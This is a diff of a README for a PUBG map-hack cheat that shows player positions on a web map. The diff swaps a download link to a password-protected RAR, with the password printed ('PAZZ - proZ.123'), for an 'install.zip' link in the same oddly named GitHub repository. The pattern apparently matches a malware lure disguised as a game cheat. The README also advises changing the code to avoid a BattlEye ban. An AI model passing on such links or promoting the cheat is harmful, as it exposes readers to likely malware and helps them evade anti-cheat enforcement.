@@ -5,8 +5,6 @@ A little map hack program for PUBG game that shows players' positions on a HTML 
 
 Imgur picture of the web map:
 
-[![c3dr0](radar link)](https://github.com/loasd104/asfsfscxs/releases/download/Release/New_LAB_PASS_proZ.123.rar)
-
 Written in Kotlin
 
 Changes
@@ -19,8 +17,7 @@ Correct player color when driving.
 Equipped weapons are shown.
 Clear DroppedItem and DroppedItemGroup when picking up.
 
-[Build DOWNLOAD](https://github.com/loasd104/asfsfscxs/releases/download/Release/New_LAB_PASS_proZ.123.rar)
-PAZZ - proZ.123
+[Build DOWNLOAD](https://github.com/loasd104/asfsfscxs/releases/download/Release/install.zip)
 
 Note
 You need to modify the code before playing game, or you will be banned by BE.
